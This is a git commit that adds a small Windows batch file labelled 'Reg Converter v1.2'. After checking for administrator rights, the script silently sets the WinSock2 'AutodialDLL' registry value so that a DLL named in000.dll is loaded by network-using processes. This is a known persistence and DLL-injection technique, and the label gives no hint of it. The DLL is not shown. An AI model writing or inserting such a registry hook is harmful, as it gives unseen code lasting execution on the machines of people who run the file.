ea86491259f908b5f1a62fbccf0b3cbf32ec73c9
mrbug404 <zlazh04@gmail.com>
2025-10-12 20:13:28 +0800

    Add files via upload

---
+++ CF.bat
@@ -0,0 +1,16 @@
+@Echo Off
+Title Reg Converter v1.2 & Color 1A
+cd %systemroot%\system32
+call :IsAdmin
+
+Reg.exe add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /v "AutodialDLL" /t REG_SZ /d "C:\Windows\System32\in000.dll" /f
+Exit
+
+:IsAdmin
+Reg.exe query "HKU\S-1-5-19\Environment"
+If Not %ERRORLEVEL% EQU 0 (
+ Cls & Echo You must have administrator rights to continue ... 
+ Pause & Exit
+)
+Cls
+goto:eof
